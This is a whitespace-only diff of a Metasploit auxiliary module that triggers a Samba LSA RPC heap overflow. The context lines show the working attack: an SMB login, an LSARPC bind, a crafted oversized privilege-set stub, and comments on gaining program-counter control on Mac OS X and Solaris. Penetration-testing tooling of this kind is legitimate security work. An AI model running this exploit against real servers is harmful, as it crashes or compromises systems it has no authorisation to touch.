@@ -3,7 +3,7 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -17,10 +17,10 @@ class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::DCERPC
 	include Msf::Exploit::Remote::SMB
-	include Msf::Auxiliary::Dos	
+	include Msf::Auxiliary::Dos
 
 	def initialize(info = {})
-		super(update_info(info,	
+		super(update_info(info,
 			'Name'           => 'Samba lsa_io_privilege_set Heap Overflow',
 			'Description'    => %q{
 				This module triggers a heap overflow in the LSA RPC service
@@ -35,18 +35,18 @@ class Metasploit3 < Msf::Auxiliary
 					['OSVDB', '34699'],
 				]
 			))
-			
+
 		register_options(
 			[
 				OptString.new('SMBPIPE', [ true,  "The pipe name to use", 'LSARPC']),
 			], self.class)
-						
+
 	end
 
 	def run
-	
+
 		pipe = datastore['SMBPIPE'].downcase
-				
+
 		print_status("Connecting to the SMB service...")
 		connect()
 		smb_login()
@@ -61,13 +61,13 @@ class Metasploit3 < Msf::Auxiliary
 		#    Linux: Needs heap magic to work around glibc (or TALLOC mode for 3.0.20+)
 		# Mac OS X: PC control via memcpy to stack ptr
 		#  Solaris: PC control via memcpy to stack ptr
-		
+
 		stub = lsa_open_policy(dcerpc)
 		stub << NDR.long(1)
 		stub << NDR.long(0xffffffff)
 		stub << NDR.long(0x100)
 		stub << "X" * 0x100
-		
+
 		print_status("Calling the vulnerable function...")
 
 		begin
@@ -82,8 +82,8 @@ class Metasploit3 < Msf::Auxiliary
 				raise e
 			end
 		end
-		
-		disconnect	
+
+		disconnect
 	end
 
 end
